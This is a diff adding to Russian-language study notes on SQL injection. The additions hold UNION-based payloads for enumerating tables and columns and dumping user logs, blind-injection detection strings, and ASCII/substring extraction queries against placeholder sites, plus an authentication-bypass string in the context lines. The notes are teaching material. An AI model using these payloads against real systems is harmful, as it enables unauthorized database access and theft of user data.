@@ -49,6 +49,7 @@ password' OR login='admin'--
 Для оператора LIKE символ % - любая строка. 
 Авторизация. В поле password вводим %
 Ex: SELECT * FROM users WHERE login LIKE 'admin' AND password LIKE '%'
+------------------------------------------------------------------
 
 2. Тип инъекций.
 
@@ -64,6 +65,85 @@ SELECT user, date FROM table_1 UNION SELECT value FROM table_2 (несовпад
 
 Запрос который ничего не выведет.
 SELECT user, date FROM table_1 UNION SELECT user, string FROM table_2 (несовпадение типов столбцов)
+
+Ex: http://something.com/logs.php?id=1 (адресная строка)
+SELECT Users.user, Logs.log FROM Users, Logs WHERE Logs.sid=$id
+
+Запрос на таблицы в базе:
+http://something.com/logs.php?id=1 UNION SELECT TOP 10 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+
+Запрос на имена колонок:
+http://something.com/logs.php?id=1 UNION SELECT TOP 10 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="table name"--
+
+По итогу получения названия всех колонок и таблиц можно получить логи всех пользователей:
+http://something.com/logs.php?id=1 UNION SELECT Users.user, Logs.lo FROM Users, Logs WHERE Logs.sid = Users.id
+
+
+    2.2 Blind injection
+Не отображает ответы ошибок.
+
+****Normal blind****
+
+Ex: http://test.com/something.php?id=1
+SELECT title, descr, body FROM something WHERE id=$id
+
+http://test.com/something.php?id=1 and 1=1 (вернет то же самое)
+
+http://test.com/something.php?id=1 and 1=0 (никогда не выполнится)
+SELECT title, descr, body FROM something WHERE id=$id AND 1=0
+
+Payloads для определения Blind-inj
+AND true
+AND false
+'AND true-- -
+'AND false-- -
+'AND true %23
+'AND false %23
+
+Эксплуатация.
+SELECT title, descr, body FROM something WHERE id=$id AND ASCII(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1), 1,1))>100
+SELECT title, descr, body FROM something WHERE id=$id AND X>100
+
+ASCII(symbol) - возвращение кода символа по ascii
+substring(string, start_symbol, count_symbol) - возвращение подстроки и строки
+SELECT table_name - получить название таблицы.
+
+Если Х>100 вернёт true(страница появилась), то название таблицы начинается не с ascii 100, а если вернет false(страница пропала), то начинается с ascii 100. 
+Методом перебора узнаем название таблицы.
+
+------Другой способ
+Использование dual и LIKE.
+% - строка произвольной длины.
+_ - любой символ.
+
+Ex: 'something.com' LIKE '%thing%' - true.
+    'something.com' LIKE '%.c' - false.
+
+    'test.com' LIKE '___t.c__' - true.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
